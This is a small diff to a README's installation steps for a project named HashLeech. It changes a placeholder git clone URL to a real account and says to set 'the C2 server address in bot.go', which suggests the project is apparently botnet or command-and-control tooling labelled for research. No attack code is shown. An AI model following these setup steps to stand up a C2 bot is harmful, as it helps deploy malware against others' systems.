@@ -38,11 +38,10 @@ graph TD
 
 Installation
 For Research/Testing Purposes
-```Text
+
 Clone the repository:
-```
 ```bash
-git clone https://github.com/yourusername/HashLeech.git
+git clone https://github.com/1Birdo/HashLeech.git
 cd HashLeech
 Configure the C2 server address in bot.go:
 ```
